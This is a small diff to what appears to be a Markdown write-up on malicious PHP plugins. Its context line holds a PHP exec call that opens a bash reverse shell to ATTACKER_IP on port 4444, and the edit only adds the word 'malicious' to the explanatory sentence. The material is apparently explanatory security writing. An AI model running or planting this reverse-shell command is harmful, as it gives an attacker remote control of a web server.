@@ -91,7 +91,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
 ?>
 ```
 
-When placed in a plugin directory, the web server executes this code when the plugin is loaded.
+When placed in a plugin directory, the web server executes this malicious code when the plugin is loaded.
 
 ---
 
